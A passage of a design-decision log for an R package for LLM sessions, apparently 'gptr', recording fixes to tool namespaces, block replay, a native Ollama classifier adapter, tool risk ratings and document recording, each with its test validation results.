   found as `gptr$taken$t1()`, which `ns_resolve()` refuses. It now offers namespaced tools only in
   namespaces `ns_plugin_namespaces()` offers and un-namespaced ones only when `ns_member_ok()`
   accepts them (the plan's kinds are unchanged).
4. **Help of a `hidden` member.** `member_help("<ns>/<name>")` read the spec with
   `registry_get()` and showed the schema of a `hidden` plugin member (IC-37: callable by gptr code
   only; `ns_resolve()` refuses it). The new `ns_plugin_spec()` applies `ns_resolve()`'s rule
   (offered namespace, not hidden, a `fun` or an `execute`); otherwise the R help lookup answers.
5. **A primitive `fun`.** `ns_tool_help()` compared the schema with `formals(fun)`, NULL for a
   primitive, so `gptr$help("total")` for `fun = sum` listed no argument; it now reads
   `ns_fun_formals()` (D-116 item 7).
6. **Help in a package that is not installed.** `utils::help(topic, package = "nopkg")` signals
   "there is no package called 'nopkg'", which `member_help()` let through; `ns_r_help()` now
   answers "No help found for '<topic>' in package '<package>'.", as for a missing topic.
7. **A catalog service that answers no string.** A `skill.catalog` or `mcp.catalog` service
   (contract 7.0: `chr(1)`, `mcp.catalog` also NULL) that answered `character()` failed
   `member_search()` with "argument is of length zero" (`split_lines_count()` of a zero-length
   value); anything but one non-NA string now adds no document, as a failing or NULL-answering
   service already did.
8. **Text that is not valid UTF-8 (review round 1).** One `search_source` document, one line of a
   `skill.catalog`/`mcp.catalog` text or a query with an invalid byte made the whole
   `gptr$search()` fail with a base error ("input string 1 is invalid UTF-8" from
   `bm25_tokenize()`'s PCRE `gsub()`; the catalog line also warned "unable to translate ... to a
   wide string"), although the source itself had not failed; `as_utf8()` only marks such a string.
   The new `search_utf8()` applies `as_utf8()` and then turns each invalid byte of a string that is
   still not valid UTF-8 into U+FFFD (`iconv(sub = replacement_sub)`, the unmarked replacement
   `read` uses, report 11 row 9). `search_sources()` applies it to `id`, `text` and `kind`,
   `ns_catalog_docs()` to the catalog text, and `bm25_tokenize()` to its input (queries, and the
   documents P18 indexes); valid text tokenizes as before.

Validation: `progress/P10.md`, Task 9. Four added test blocks (25 expectations). Against the
plan-literal source with the final test file `[ FAIL 11 | WARN 0 | SKIP 0 | PASS 189 ]`
(`task9-red-final-plan-literal.log`); green `^tool-namespace$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 201 ]` (`task9-green.log`). Review round 1 added a fifth block
(8 expectations; item 8): red `[ FAIL 1 | WARN 0 | SKIP 0 | PASS 201 ]`
(`task9-fix1-red.log`), green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 209 ]` (`task9-fix1-green.log`);
probe `task9-fix1-probe.R` (`task9-fix1-probe-before.log`, `task9-fix1-probe-after.log`).

## D-119 - P15 replay decisions and replaying fresh blocks: a stale block under replay is also not_recorded, an S2 record without a usable answer replays without one, the old block is skipped only in the gptr_source() frame of its own document (the knitr skip comes with Task 16), and malformed children entries are skipped, and (review round 1) an undone block regenerates under record with every driver and a hand-edited block is not offered for overwriting where it cannot be regenerated, and (review round 2) a hand-edited block whose prompt or args changed is stale (2026-10-05)

P15 Task 12's plan-literal source (`R/doc-replay.R`: `doc_decide()`, `doc_skip_old()`,
`doc_block_text()`, `doc_replay_doc()`, `doc_replay_header()`, `doc_replay_call()`,
`doc_run_block_nested()`, `doc_replay_team()`) changed in seven ways (items 5 and 6 are the
review round 1 amendment, item 7 the review round 2 amendment). The signatures are the plan's;
one internal helper is new, `doc_s2_answer(rec)`.

1. **A stale block under `replay` is also `not_recorded`** (contract 2.2: `stale_block` has the
   parent `not_recorded`, as P06's `replay_unbound` does). The plan signalled the class
   `stale_block` only, so a handler for `gptr_error_not_recorded` (the replay-mode refusal)
   missed it. It is now `c("stale_block", "not_recorded")` with `document` and `block`.
2. **An S2 record without a usable answer replays without one.** P06's
   `session_replay_apply()` requires `text` to be NULL or one non-empty string, and
   `s2_put()` stores a record without an answer as `""`. The plan passed `rec$answer` through,
   so a fresh block or block-nested call whose cached record had an empty answer, or (in a
   hand-edited or foreign cache file) a non-text one, failed with `gptr_error_invalid_argument`
   instead of replaying. `doc_s2_answer()` turns such an answer into NULL (no `last_text`; a
   reconstruction says the answer was not recorded); a team whose children gave no text passes
   NULL rather than `""` as its own text.
3. **`doc_skip_old()` marks only the innermost `gptr_source()` frame of the site's own
   document** (the check `doc_driver()` and `doc_source_log()` make), and has no knitr branch
   yet. The plan added the block to whichever frame was innermost, and its knitr branch calls
   Task 16's `doc_knitr_skip()`, which does not exist yet: naming it fails the package lint
   (`object_usage_linter`: no visible global function definition,
   `dev/.validation/P15/task12-lint-plan-literal.log`), while stubs and suppressions are not
   allowed (the D-107 item 4 precedent). **Task 16 adds `else if (identical(site$driver,
   "knitr")) doc_knitr_skip(paste0("gptr-", id))` to `doc_skip_old()`.** `doc_decide()` still
   answers `"regenerate"` for a knitr site as planned; nothing calls `doc_skip_old()` before
   Task 13's route, and knitr chunks are skipped from Task 16 on.
4. **Malformed `children=` entries are skipped**: an entry without both a name and a session id
   (`":s2222222222"`, `"code:"`) is passed over like one of the wrong arity, since P06's
   `session_replay_bind()` refuses an empty child name.
5. **An undone block regenerates under `record` with every driver** (review round 1). The plan
   sent the undone `record` cell through the driver check, so under base `source()`/Rscript
   it answered `"replay"` with `replay_downgraded` ("the recorded code runs anyway"). Contract
   7.15 takes the undone row from G7 section 3.8, where `record` is "regenerate in place (the
   block becomes live)" without report 14's driver footnote, and architecture 6.9.3 downgrades
   only "live and stale regeneration". An undone block is inert (`#~ ` lines; `eval=FALSE` in
   Rmd/qmd; `#~ ` cell source in ipynb), so no driver can run it twice; replaying it instead
   gave a session claiming the turn the user undid (its `value=` name designated but never
   bound) and a false warning. `doc_decide()` now answers `"regenerate"` there directly;
   `doc_skip_old()` stays harmless for an inert block.
6. **A hand-edited block is not offered for overwriting where it cannot be regenerated**
   (review round 1). Under base `source()`/Rscript the plan asked "Overwrite it?" in `live` and
   `record` although a yes could only downgrade to replay. `doc_decide()` now downgrades first
   (the same `replay_downgraded` warning as a stale block there) and asks only under a driver
   that can skip the old block.
7. **A hand-edited block whose `prompt=` or `args=` no longer matches is stale too** (review
   round 2). `doc_block_status()` ranks `user-edited` above `stale`, and the plan's
   `user-edited` cell answered `"replay"` in `auto` and `replay` without comparing the hashes
   (self-review ambiguity 4: "otherwise replays (user code wins)"). IC-45 (section 15, which
   wins) says a block is fresh only when `prompt=` and `args=` both match and a stale block
   under `replay` errors `gptr_error_stale_block`; contract 2.2 defines `stale_block` as "replay
   mode and the block's prompt or interpolated values changed"; architecture 6.9.3 keeps
   `args=` "so a parameterised report never replays another parameter's block" (acceptance 6e).
   With the plan's cell a typo fix in a recorded block made a changed prompt or another
   parameter pass silently, even under `GPTR_REPLAY=replay`, and `doc_replay_call()` attached
   the S2 answer of the old args hash. `doc_decide()` now also compares the header without
   `sha=` with the call's hashes. When they moved: `replay` signals
   `c("stale_block", "not_recorded")` (the stale cell's error); `auto`, `live` and `record` take
   the hand-edited overwrite path (a driver that can skip the old block asks "Overwrite it?"
   and regenerates after a yes; a no, no human to ask, or base `source()`/Rscript downgrades
   to replay with `replay_downgraded`, never silently). User code still wins without a warning
   while both hashes match.
a local `ollama/qwen3:8b` child and a piped session while `catalog_discover()`,
`catalog_ollama_discover()`, `model_prepare()` and `http_handle()` are mocked to fail and are
counted (review round 1: P06's `model_canonical()` and the HTTP reactor catch errors, so a
refusal alone could be swallowed; the test asserts zero calls); the replayed sessions keep
the local model tag, and the reconstructed answer is recorded with provider `ollama` and model
`qwen3:8b`.

Validation: `progress/P15.md`, Task 12. Seven tests added (39 expectations) after the plan's six
(54, verbatim). Against the plan-literal source with the final test file
`[ FAIL 4 | WARN 0 | SKIP 0 | PASS 131 ]` (`task12-plan-literal.log`; items 1-4, one each); green
`^doc-replay$` `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 145 ]` (`task12-green.log`). Review round 1
added one test and changed two (items 5 and 6, the IC-74 count; 27 more expectations; the
hand-edited test now expects 3 questions, not 4): against the round-0 source
`[ FAIL 5 | WARN 0 | SKIP 0 | PASS 167 ]` (`task12-fix1-red-final.log`; item 5 four, item 6
one), green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 172 ]` (`task12-fix1-green.log`). The IC-74
count passes on both sources; with discovery injected where `model_canonical()` swallows it,
the old test passes and the new one fails (`task12-fix1-negative-ic74.log`). Review round 2
added one test (item 7, 31 expectations): against the round-1 source
`[ FAIL 8 | WARN 0 | SKIP 0 | PASS 178 ]` (`task12-fix2-red.log`; the test stopped at its
first auto-mode downgrade), green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 203 ]`
(`task12-fix2-green.log`).

## D-120 - P13 native Ollama System One (IC-74, coordinator-added task 8b): the `ollama-system-one` adapter validates Ollama's own entropy confidence and refuses answers without probabilities or from another model, a model's decision record only lowers the adapter's limits, an oversized state fails alone while bad questions or images end the call before any request, Clef is admitted one request at a time per server across calls, no key is ever looked up for it, a live call prepares a referenced Ollama model, replay reads answers and the model identity frozen with them from cache pins without discovery or preflight, and the replay guard runs before the egress check, and (review round 1) a native Ollama model without max_active is still admitted one request at a time per server and its answers are checked at Ollama's four-decimal rounding (2026-10-05)

P13 has no plan text for `R/s1-ollama.R`; `07-local-ollama.md` sections 2-6 are the
specification (HANDOFF: "add it after P13 Task 8 and before Task 9"). Files: `R/s1-ollama.R`
(new), `R/s1-client.R`, `R/s1-route.R`, `tests/testthat/test-s1-ollama.R` (new),
`tests/testthat/test-live-ollama-s1.R` (new, gated), `tests/testthat/fixtures/ollama/` (new),
`tests/testthat/fixtures/jev/harness.R`, one adapted assertion pair in
`tests/testthat/test-s1-route.R`. The readings and choices that go beyond the specification's
words:

1. **Wire shape.** Taken from Ollama's published System One reference (report 04b's sources):
   `{model, state, questions, images?}`; questions keyed by id; `criteria` an object for choices
   (null descriptions) and an array for scores; answers keyed by id with `noul`, or `choice`,
   `probabilities`, `confidence`, or `score`, `legend`, `probabilities`, `confidence`; `usage`
   `{input_tokens, output_tokens}`; errors `{"error": "<text>"}` with 400, 404, 413 and 500. The
   six fixtures under `fixtures/ollama/` are synthetic, in that shape. Only the opt-in live test
   checks them against a real server.
2. **Confidence.** A wire confidence must lie within 0.01 of `1 - H(p) / log(N)` computed from
   the reported probabilities (zero probabilities add nothing). The 0.01 tolerance covers rounded
   probabilities, and Jev's peak formula fails it on any distribution that is neither uniform
   nor certain. A missing confidence is computed with that formula, never Jev's. Unlike
   TypeSafe's gateways (report 04 section 2.9), a missing or empty probability map is a
   malformed Ollama answer (`s1_response`), not "unknown". An answer whose `model` names another
   model (after `:latest` normalisation) is refused. A score legend, when sent, must name exactly
   the levels; the canonical legend is the request's descriptions.
3. **Limits.** 64 questions, 26 options or levels, 64 KiB text bodies and 32 MiB image bodies are
   the adapter's. A model's decision record (`max_questions`, `max_options`,
   `max_request_bytes_*`) can lower them, never raise them. Question problems and image problems
   are the call's (`gptr_error_invalid_argument`, raised before the first request). Images are
   also checked before anything is sent: MIME type png/jpeg/webp, bytes that match it, and
   base64 within the image limit. An empty state, or one whose exact body exceeds the limit,
   fails that element alone: `build` signals `gptr_error_s1_validation`, and `s1_request()` now
   records any `gptr_error_s1` from an adapter's `build` as that element's failure (NA plus the
   `s1_errors` warning in a vector, the error itself in a scalar call). The loaded context is
   not pre-estimated: Ollama refuses an overflow explicitly (report 04b), and that error is
   passed on.
4. **Unsupported weights.** `s1_ollama_ready()` refuses a decision model whose weights P05's
   discovery reports in a format other than GGUF (`gptr_error_not_available`). Report 04b says
   MLX or Safetensors variants are not served by `/v1/systemone`. A bare catalog name reads the
   format of the discovered `:latest` entry with the same digest; an unknown format is left to
   the server.
5. **Per-server admission** (07 section 2, section 6 P13 row). Task 8 capped each call at the
   decision record's `max_active`. Now a process-wide slot table keyed by the endpoint's
   canonical origin also holds a call's requests until the server has a free slot. A request
   keeps its slot from start to `done()`, and slots of requests that never report (an
   interrupt, a start that failed) are given back on exit. This covers nested and concurrent
   System 1 calls of the same process. TypeSafe has no such gate (P04's token bucket, IC-64).
6. **No key.** For the `ollama-system-one` api, `s1_request()` never looks a credential up, and
   `build` never sends one (07 section 3: "never attach a Jev/cloud credential").
7. **Live preparation.** Task 8's `s1_ready()` only preflighted, so a fresh process needed an
   explicit `model_prepare()` or `gptr_models(refresh = TRUE)` first. A native Ollama model named
   by reference is now prepared on a live call through P05's `model_prepare()` (a contract 7.5
   consumer for P13). It discovers only when evidence is missing or stale, and refuses a
   forbidden endpoint before any request. A provider spec is still preflighted only.
8. **Replay with the frozen identity** (07 section 4). Live keys carry the digest and server
   version from P05's discovery, which offline replay cannot know. So every cached native
   answer is also pinned: a record under a key without those two fields, holding the answer's
   key and the identity (adapter, digest, server version, locality). Under replay (the call's
   `replay =`, else the process mode) a native Ollama target is frozen: no discovery, no
   preflight, no request. Answers come through the pins, and the frozen identity fills the
   provenance. A pin without an identity, a pinned model digest that differs, an answer key
   that the frozen identity and the local images do not reproduce, or states recorded under
   different identities are refused with `gptr_error_not_recorded`. A missing pin is a miss,
   which the replay guard refuses as before. Because the test process replays, Task 8's test
   "the request preflight runs before the call's values are read" now passes
   `replay = "auto"` for its two live calls.
9. **Guard order.** `s1_guards()` runs the replay guard before `egress_check()`. Under replay
   nothing leaves the machine, so a miss is `not_recorded` and never asks for an egress
   acknowledgement (before, a remote endpoint's miss was `gptr_error_egress`).
10. **Timeouts.** The first byte may take 120 s (a non-streaming decision arrives only after a
    cold model load and the scoring pass); the idle timeout stays 30 s.
11. **Registration.** Task 9's `builtin_system1()` does not exist yet. Until it does, the
    adapter is registered by the harness's `local_s1_ollama_adapter()`, as Task 4-8 tests
    register `typesafe-system-one`. Task 9 must register
    `gptr_adapter("ollama-system-one", transport = "http_json", classify = list(build =
    s1_ollama_build, parse = s1_ollama_parse))`.

P01's fake classifier, `s1_typesafe_parse()` and emulation already return the canonical shape
(Tasks 3, 6 and 8), so they needed no change.

Validation: `progress/P13.md`, Task 8b. Red `^s1-ollama$` `[ FAIL 17 | WARN 0 | SKIP 0 |
PASS 0 ]` (`dev/.validation/P13/task8b-red.log`); every failure is a missing `s1_ollama_*`
function. Green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 243 ]` (`task8b-green-ollama.log`).
Negative control with the confidence formula, the gate, the keyless headers and the frozen
replay sabotaged: `[ FAIL 32 | WARN 0 | SKIP 0 | PASS 178 ]` (`task8b-negative.log`). With the
egress-first guard order alone: `[ FAIL 1 | ... | PASS 238 ]` (`task8b-negative-guard.log`).

Review round 1 (`progress/P13.md`, Task 8b review round 1; D-120's first version landed in
`1b2d566`, P10's commit, which staged the whole file):

12. **Admission without a decision record** (amends item 5). A native Ollama model whose record
    sets no `max_active` had no per-server gate and the global cap (8): a provider spec, which
    P05's preflight checks against the discovery evidence without adding the discovered decision
    record, sent six states to a local Clef at once. `s1_own_active()` now gives such a model
    Ollama's default of one active request per server (`s1_ollama_max_active`), for the per-call
    cap and the per-server gate alike. Only an explicit decision record raises it (07 section 2:
    "User changes to concurrency are explicit"), and `gptr.s1_max_active` stays the upper bound;
    a `max_active` beyond the integer range means no own limit below that cap.
13. **Four-decimal rounding** (amends item 2). Ollama documents its probabilities and scores as
    rounded to four decimal places. The sum of the probabilities, the support of a choice and the
    reconstruction of a score are now checked with 5e-5 per value (`s1_ollama_round_tol`), not
    TypeSafe's 0.005, which on 26 levels let sums off by 0.13 and scores off by 1.6 levels
    through. `s1_answer_probs()`, `s1_parse_choice()` and `s1_parse_score()` take the tolerance
    as a last argument whose default stays TypeSafe's. The common dispatch recheck keeps the
    default: it revalidates canonical records that the adapter checked at its own rounding. The
    confidence slack of item 2 (0.01) is unchanged.
14. **Egress by the registered record (unchanged; forward note to P08).** `s1_guards()` asks
    `egress_check(target$model$provider)`, which judges the process-wide record of that id. For a
    call-level provider spec at another endpoint the acknowledgement names the wrong origin (an
    Ollama spec at 10.1.2.3 under a relaxed run is told about 127.0.0.1:11434), and a classifier
    spec that reuses a built-in loopback id (`lmstudio`) at a LAN address would be exempted by
    the built-in record (D-114's case). P08's `egress_require(pid, egress_state(record))` decides
    by the request's own record, but IC-33's kernel SDK (contract 12.2, enforced by
    `test-arch-layers.R`) gives an L4 file only `egress_check(provider_id)`, and contract 7.8
    lists P13 as a consumer of that signature only; calling P08's internals failed the layering
    test and was reverted. P08 (or the contract) must let the SDK verb take the request's
    provider record, for example `egress_check(provider_id, provider = NULL)`; `s1_guards()`
    then passes `target$provider`. For Ollama the local-only preflight refuses a non-loopback
    spec unless a run relaxes it, and then the registered record is not exempt either, so only
    the named origin is wrong there.
15. **Known limitation: replay of a discovered tag** (amends item 8). Replay without discovery
    works for references that P05's static catalog resolves as classifiers (`ollama/clef`,
    `ollama/clef-flash`) and for provider specs whose model record is a classifier. Without
    discovery a discovered tag such as `ollama/clef-flash:latest` resolves as a chat model
    (`model_resolve(strict = FALSE)`: type `chat`, api `openai-completions`), so `s1_target()`
    refuses it (`invalid_argument`) before any pin is read, and P08's routing would not choose
    the classifier route either. P13 does not infer a classifier from a name (07 section 2: a
    model name alone grants nothing). Offline resolution of discovered decision tags (for
    instance a `:latest` tag as its bare catalog name) belongs to P05, with P08's routing; until
    then, record and replay under the bare catalog name or a provider spec.

Review round 1 validation: the final tests against the pre-fix behaviour (a scratch copy with
`s1_ollama_round_tol = 0.005` and no Ollama default in `s1_own_active()`):
`[ FAIL 11 | WARN 0 | SKIP 0 | PASS 262 ]` (`task8b-fix1-negative.log`; 5 rounding, 6
admission). Green `^s1-ollama$` `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 273 ]`
(`task8b-fix1-green-ollama.log`; 243 + 30, with the `error-404.json` fixture now served by P01's
mock server).

## D-121 - P10 builtin:tools: an instructions file outside the project reads at level 1, `plot` as a direct tool is an error result instead of a false "attached", the edit risk rates every field the execute applies, and four P06/P07 tests no longer assume that no built-in registers the core tools (2026-10-05)

P10 Task 10's plan-literal members, executes, risk functions, specs and `builtin:tools`
(`R/tool-namespace.R`, part 4) are changed in three ways, and in three more after review round 1
(items 4-6). Member signatures, classes, condition fields, Pi's texts, descriptions, schemas,
snippets, guidelines, fragment texts and orders, and the plan's 16 test blocks are unchanged (2
blocks were added by the implementation and 3 by review round 1). The plan-literal file is kept as
`dev/.validation/P10/task10-source-plan-literal.R`.

1. **An `instructions` file reads at 0 only inside the project.** P01's `path_class()` checks
   `instructions` (`AGENTS.md`, `CLAUDE.md`, `.gptr/skills/`, ...) before `workspace`, so the
   plan's read mapping `instructions = 0L` rated an `AGENTS.md` or skill file of any directory at
   level 0, against 04 section 9.4 ("0 in project, 1 outside"). `tool_path_risk()` now reads such
   a file outside `project_root()` as `outside` (level 1). Writes keep IC-54's level 3.
2. **`plot` as a direct tool is an error result.** IC-37 lets a preset declare `plot` (it carries
   an `execute`), but `gptr$plot()` attaches to the running `r` result. The plan's execute
   answered "plot attached to the r result" when nothing was attached (no `r` call: a console
   notice, nothing attached) and, for a sub-agent's direct tool started inside a parent `r`
   evaluation, attached the image to the parent's result. `tool_plot_execute()` now runs
   `member_plot()` only for a nested member call of the running evaluation (`member_nested(ctx)`,
   the test the other executes use) and otherwise returns an error result that says to call
   `gptr$plot()` inside `r`.
3. **The edit risk rates what the execute applies.** `tool_edit_execute()` applies `patch`, else
   `edits`, else Pi's legacy top-level `oldText`/`newText`. The plan's `tool_risk_write()` looked
   for an envelope only in `patch`/`edits`, so an envelope in a top-level `newText` was rated by
   `path` alone (level 2) while the execute wrote, for example, `.gptr/mcp.json` (control, level
   4). Schema validation requires `edits`, but a `modify` hook rewrites the validated input before
   P06's `perm_check()`. Both now read the edits through `tool_edit_input_edits()`.
4. **A direct `read` or `describe` result carries the R value too** (review round 1). Contract
   10.6 says `ctx$execute_tool(name, input)` returns the tool's result value, and
   `dispatch_nested()` returns the result's `value`. The plan's direct `read` and `describe`
   results had none, so a plugin's `ctx$execute_tool("read", ...)` got `NULL` outside an `r`
   evaluation and a `gptr_lines` inside one. P10's own `R/tool-read.R` (Task 4) now builds the
   `gptr_lines` of a window in `read_lines_of()`, shared by `read_lines_value()` and `read_file()`,
   which returns it as `value` without reading the file twice and without the image block (the
   image stays the result's image). `tool_read_execute()` passes it on; `tool_describe_execute()`
   returns its lines as a `gptr_text` value. Texts and `details` are unchanged.
5. **A direct `help`, `search` or `out` uses the session of its own ctx** (review round 1). These
   members found their session through the innermost r-call marker, so a sub-agent's direct tool
   (IC-37 lets a preset or `+out` declare one), executed while the parent's `r` evaluation was on
   the stack, used the parent's session: `out` searched the parent's store and failed with "There
   is no stored output" for an id of the sub-agent's own store. `member_execute()` now binds a
   session marker (`gptr_ns_session`, the ctx's session, `NULL` for process-level dispatch) in its
   frame for a direct call, and `ns_current_session()` returns the session of the innermost of the
   two markers (no promise forced, no active binding called).
6. **Only `skill:<name>/<path>` is a skill pseudo-path for the risk** (review round 1).
   `tool_path_risk()` matched any `skill:` prefix, while `read_resolve()` treats only
   `^skill:([^/]+)/(.+)$` as a skill path and reads any other `skill:...` string as a file of the
   working directory: `skill:secrets.env` was rated level 0 although the file read is protected
   (level 2). The risk now uses `read_resolve()`'s pattern.

Outside P10's files (the D-112 precedent; no expectation and no P06/P07 code changes), four tests
of completed plans assumed that no built-in registers the core tools or an `r_session` fragment
ordered before 50. P10 registers both, as 04 section 7.10, IC-37 and IC-68 require:
- P07's "prompt_specs keeps the winning record of each name, in order"
  (`test-prompt-sections.R`) registers its `aa_early` section at order 1 instead of 50, so it is
  still first with P10's `helpers` fragment (order 10) registered.
- P06's two fallback-freeze tests (`test-agent-run.R`) got `tool_names` `read`, `edit`, `write`
  instead of the test's own `read`. P06's "a token budget stops the run before the next request
  with status budget" (`test-session-budget.R`) sent no request, because the real `read`, `edit`
  and `write` schemas pushed the first request's estimate over its 1,000-token budget. These three
  tests call the new `local_without_builtin("tools")` of P06's harness
  (`tests/testthat/fixtures/oracles/report02/harness.R`). It sets a user-scope `-builtin:tools`
  filter and removes it after the test.

Validation: `progress/P10.md`, Task 10. Against the plan-literal source, the final test file gives
`[ FAIL 6 | WARN 0 | SKIP 0 | PASS 378 ]` (`task10-red-final-plan-literal.log`). The probe
(`task10-probe1.R`) shows each case before (`task10-probe1-plan-literal.log`: an outside
`AGENTS.md` and skill file at level 0, "plot attached to the r result" with `is_error` FALSE, and
an envelope in `newText` rated 2 while `.gptr/mcp.json` is written) and after
(`task10-probe1-after.log`). Review round 1 (items 4-6): the 3 added blocks are red before the fix
`[ FAIL 11 | WARN 0 | SKIP 0 | PASS 385 ]` (`task10-fix1-red.log`). Final `^tool-namespace$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 398 ]` (`task10-fix1-green.log`).

## D-122 - P15 builtin:documents: a console call located after the transcript question is top level, a failing sidecar recovery never disables the route, doc.edit protects a hand-edited block also against a loose match and `old_text`, an open notebook or the running Rscript script is never made inert, rewind entries keep the recorded format, an all-NA score summary reads "mean NA", document formats are read without tools::file_ext(), a failed direct R line is recorded inert, the transcript question is asked only when the call could be recorded, an undone team block gets the undone notice, a call whose block a dead sidecar held is replayed after the recovery, System 1 one-line blocks are redacted, a rewind's own undone entries never revive a block, doc.replay recovers a dead sidecar first, a rewind changes the queued blocks of the running script or the open notebook, and doc.edit never edits either (2026-10-05)

P15 Task 13 registers `builtin:documents` (the five formats, the route `document` at order 50,
the `documents` section, the `agent_end`, `session_tree`, `console:command` and `console:direct`
handlers, and the services `doc.site`, `doc.edit`, `doc.s1_block`, `doc.replay`). The plan's
source passes all of its own tests unchanged (`dev/.validation/P15/task13-green0.log`). Against
the plan-literal source the final tests fail 18 (`task13-adapt-red-plan-literal.log`). The
following changes go beyond the plan literal; no signature, condition class, event payload, entry
shape or section text changes.
1. **A console call located after the transcript question is top level.** `doc_locate()` sets
   `call$top_level` and gives a console site `top_level = TRUE`. When no target was remembered,
   the route asks where to record (IC-49, IC-52) and builds the console site itself, but the plan
   left `call$top_level` at the `FALSE` that `doc_locate()` had set. The route now sets it to
   `TRUE` when the question gave a site, as a remembered target would have.
2. **A failing sidecar recovery is a diagnostic.** P08's `route_matches()` turns an error in
   `match()` into a skipped route, so a sidecar that `doc_recover()` cannot read made the call
   bypass `document`: a fresh block ran live instead of replaying (IC-45). The recovery is now
   wrapped in `tryCatch()` with a `registry_diagnostic()`; replay and recording go on.
3. **doc.edit never changes a hand-edited block** (contract 7.0, 7.10). The plan refused an edit
   only when its `oldText` matched a hand-edited block's lines exactly. P10's edit tool also
   accepts `old_text` (`edit_normalize_args()`) and matches loosely when the exact text is not
   found. With the plan literal, a loose match rewrote the hand edit and then refreshed the
   block's `date=` and `sha=`, so the block read as gptr's own. Now `old_text` is read too, and
   after the tool ran, a hand-edited block whose body changed is restored (the text before the
   edit is written back under the md5 check) and the edit is refused with the same error result.
4. **An open notebook and the running script are never made inert.** IC-50: gptr never writes the
   notebook open in this Jupyter kernel; D-109: the script this process runs under Rscript is
   written only at its exit. `doc_set_inert()` (the `session_tree` hook) wrote both. It now
   writes neither, returns `FALSE` and prints one notice. Review round 4 (item 15) replaced the
   notice: their blocks are now made inert in this process's queue.
5. **Rewind entries keep the recorded format.** The plan wrote `doc_format_of(doc)` into the
   `gptr.doc_block` entries it appends, so a console transcript block (recorded with `format =
   "transcript"`) was logged as `"r"` when undone or revived. The entry now repeats the format the
   block was recorded with. Records without a string `doc` or `block` are skipped instead of
   failing `vapply()`.
6. **An all-NA score summary reads "mean NA".** The plan's `doc_s1_summary()` gave
   `mean NaN` (the mean of nothing) where P13's own `s1_summary()` gives `mean NA`.
7. **Document formats are read with P01's `path_ext()`** (FIX-5, CI-5, D-111 item 1).
   `doc_format_of()` called `tools::file_ext()`, which on R >= 4.6 calls `basename()` and stops on
   a non-ASCII document name in a non-UTF-8 locale. Every caller of `doc_format_of()` (the
   locator, the writer, transcript targets) is affected. R 4.6's rule is kept: `".R"` has no
   extension.
8. **A direct R line that did not finish is recorded inert** (review round 1; IC-49, 03 section
   6.9.3 "the transcript re-sources as one steered session"; 04 section 11.5 "Failed executions
   ... are not recorded"). The plan's `doc_on_console_direct()` ignored the `status` of P14's
   `console:direct` payload, so a line that failed (`!summary(fti)`) stopped `source()` of the
   transcript there, and an interrupted or timed-out computation ran again in full. A line whose
   `status` is not `"ok"` is now written as `# direct R (no model; <status>)` with its code as
   `#~ ` lines and no `#>` output; a payload without `status` is a line that ran.
9. **The transcript question is asked only when the call could be recorded** (review round 1;
   IC-52). The route asked "Record this console session into ...?" under `record = "off"` and in
   replay mode, where `run()` then drops the site; the answer was still remembered, so the one
   question per project was spent on nothing. The route now asks only when the replay mode is
   `auto`, `live` or `record` and `record` is not `"off"`; a remembered target still gives the
   site without a question.
10. **An undone team or fan-out block gets the undone notice** (review round 1; G7 section 3.8
   undone row: "skip, zero tokens, one message"). `doc.replay` replayed it with no message and
   logged it `replayed`. It now prints the route's notice ("Block ... was undone by /rewind; ...")
   and logs `skipped` in the `gptr_source()` frame. The zero-request replayed session is still
   returned: `doc.replay` answers a session or `NULL` (04 section 7.0), and `NULL` makes P19's
   `team`/`fanout` route run the statement live, which the undone row forbids.
11. **A call whose block a dead sidecar held is replayed after the recovery** (review round 2;
   IC-51, IC-45). The route located the call first and recovered the dead process's sidecar
   second (plan literal). Without a deferred backend (plain `source()`, knitr, an IDE run) the
   recovery writes the blocks to disk, but the site found before that write had no block, so a
   call whose own block was in the sidecar ran live, spent tokens and was recorded a second time
   (two blocks for one statement; on the next `source()` both ran). When `doc_recover()` wrote
   the document (it returned `TRUE`, the site is neither deferred nor a console site), the route
   now locates the call again and keeps the new site when it is still top level or block-nested.
   A deferred site is unchanged: its adopted upserts are written at exit (an `Rscript --file=`
   site, the only finder that counts executions, is always deferred, so it is never located
   twice).
12. **System 1 one-line blocks are redacted** (review round 2; IC-74, 07 section 6, P15 row
   "redacted, consented workflow records"). `doc.s1_block` wrote the summary as given, and
   `doc_upsert()` does not redact; a free-text `gptr_choice` level shaped like a token reached the
   document verbatim. The `#> ` line is now `redact(..., "persist")`ed before it is written.
13. **A rewind's own `undone` entries never revive a block** (review round 3; G7 sections 3.8
   and 4.4; 04 section 7.15 "a `session_tree` hook that makes undone blocks inert"). The plan's
   `doc_on_session_tree()` chose blocks from every `gptr.doc_block` record between `from` and
   `to`, its own `undone` entries included. P16 appends the `gptr.rewind` entry under the rewind
   target (P16 Task 7, `ckpt_append_at()`) before `session_tree`, so those entries sit under the
   target and a new turn on the rewound branch descends from them. Moving back onto that branch
   later then revived the block of the abandoned turn (rewind A -> R, new turn C, redo to A, back
   to C left both blocks live). Only records that wrote a live block (`insert`, `replace`,
   `stale-regenerate`) now choose the blocks to make inert or revive.
14. **doc.replay recovers a dead process's deferred writes first** (review round 3; IC-51 "the
   next `gptr()` ... touching that document ... re-applies unapplied upserts of a dead pid";
   IC-47). P19's `team` and `fanout` routes (orders 15, 16) call `doc.replay` and handle the
   statement before the `document` route (order 50) runs, so the recovery the route does
   (item 11) was never reached for a team or fan-out statement; when the sidecar held that
   statement's own block, `doc.replay` returned `NULL` and the team would run live and be
   recorded twice. The route's recovery and re-location are now one helper, `doc_touch()`, which
   `doc.replay` also runs once it has located a top-level statement (a failing recovery is a
   diagnostic there too).
15. **A rewind makes the queued blocks of the running script or the open notebook inert**
   (review round 4; 04 section 7.15 "a `session_tree` hook that makes undone blocks inert"; G7
   section 4.4 "In a first live run the call really restores, and it then marks the blocks";
   IC-50, IC-51, D-109). Under Rscript a script's blocks wait in the deferred queue, and in a
   Jupyter kernel a notebook's blocks wait as pending upserts. Item 4 stopped `doc_set_inert()`
   from writing those files but left the queue as it was, so the exit finalizer or
   `gptr_doc(path, sync = TRUE)` later wrote the abandoned turn's block as live code, and a later
   `source()` ran it. `doc_set_inert()` now hands such a document to `doc_pending_inert()`
